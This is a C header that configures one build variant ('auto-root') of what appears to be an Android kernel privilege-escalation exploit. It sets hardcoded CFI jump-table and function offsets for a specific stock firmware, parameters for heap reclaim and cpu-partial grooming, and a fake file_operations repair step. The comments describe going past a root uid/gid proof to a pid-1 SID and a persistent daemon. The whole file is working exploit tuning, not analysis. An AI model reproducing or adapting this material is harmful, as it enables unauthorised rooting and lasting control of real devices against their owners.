#include "../sh53d-prewake-linearmap-auto-root/target.h"

#undef BUILD_VARIANT_LABEL
#define BUILD_VARIANT_LABEL "sh53d-prewake-linearmap-auto-root-nomut"

/* Use the current cleanup/quiet-reclaim allocator path.  The forced slide is
 * obtained from tracefs in the same boot before launching this payload. */
#define APP_REQUIRE_FRESH_P0_SESSION 1
#define APP_TRUST_FORCED_P0_SESSION 1

/* The mutation scanner drains the skb reclaim sockets before CFI and can
 * release the reclaimed payload page.  The RB store geometry has already
 * been verified by the self-target artifact, so keep the production page
 * resident and go directly to the CFI consumer. */
#undef FOPS_RECLAIM_MUTATION_DIAG
#define FOPS_RECLAIM_MUTATION_DIAG 0
#undef FOPS_RECLAIM_MUTATION_DIAG_CONTINUE_CFI
#define FOPS_RECLAIM_MUTATION_DIAG_CONTINUE_CFI 0

/* rtmutex case-1 overwrites fake file_operations.owner with rb parent/color. */
#undef REPAIR_FAKE_FOPS_OWNER_BEFORE_CFI
#define REPAIR_FAKE_FOPS_OWNER_BEFORE_CFI 1

/* The per-file target is restored from an untouched ashmem file's runtime
 * file->f_op value.  The self-build ashmem_fops data address is not proven to
 * match stock because proprietary linked objects can move data symbols. */
#define REQUIRE_RUNTIME_CONTROL_FOPS_RESTORE 1

/* 0x3c0-byte mm_struct uses the stock 1k-cache cpu-partial limit. */
#undef MM_PARTIALS
#define MM_PARTIALS 13

/* Real function body used only as a PMU PC filter.  The fops slot contains
 * the CFI jump-table address at ASHMEM_IOCTL_OFF. */
#define ASHMEM_IOCTL_BODY_OFF 0x0d0764ULL
#define FILE_F_OP_OFF 0x28ULL

/* Stock 38JP_1_30I CFI jump-table entries measured on boot158.  These are
 * signature-group addresses and cannot be derived from the mmap group's
 * +0x1ffc drift.  Native ASHMEM_GET_SIZE sampled unlocked_ioctl directly at
 * 0x113551c.  The configfs read candidate is bracketed by stock read_null and
 * kernfs_fop_read, whose complete interval retained the self-build layout;
 * the write candidate immediately precedes the measured adjacent
 * proc_pid_attr_write/sched_write entries. */
#undef ASHMEM_IOCTL_OFF
#define ASHMEM_IOCTL_OFF 0x113551cULL
#undef CONFIGFS_READ_ITER_OFF
#define CONFIGFS_READ_ITER_OFF 0x1134968ULL
#undef CONFIGFS_BIN_WRITE_ITER_OFF
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x1130ec8ULL

/* Continue past the established uid/gid proof into the pid-1 SID and
 * persistent daemon path.  ROOT_DIRECT_USABLE_ROOT=0 at runtime restores the
 * exact proof-only behavior for A/B checks with the same binary. */
#define ROOT_DIRECT_USABLE_ROOT 1
